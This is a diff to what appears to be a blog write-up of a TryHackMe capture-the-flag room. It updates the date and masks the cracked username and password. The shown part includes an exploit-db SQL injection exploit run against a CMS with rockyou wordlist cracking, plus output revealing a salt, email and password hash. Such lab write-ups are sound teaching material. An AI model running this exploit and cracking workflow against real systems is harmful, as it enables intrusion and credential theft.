@@ -1,6 +1,6 @@
 ---
 title: Write-up — EasyCTF
-date: 2024-06-29 10:00:00 AM
+date: 2025-06-29 10:00:00 AM
 categories: [Write-up, Try Hack Me]
 tags: [Try Hack Me, Write-up, ctf, Easy]
 image: 'assets/img/articles/EasyCTF.png'
@@ -36,10 +36,10 @@ SQLi (https://www.exploit-db.com/exploits/46635)
 ./exploit.py -u http://$TARGET/simple/ -c -w /usr/share/wordlists/rockyou.txt
 
 [+] Salt found: 1dac0d92e9fa6bb2
-[+] Username found: mitch
+[+] Username found: *****
 [+] Email found: admin@admin.com
 [+] Password hash found: 0c01f4468bd75d7a84c7eb73846e8d96
-[+] Password cracked: secret
+[+] Password cracked: ******
 ```
 
 `-c` for enabling cracking.
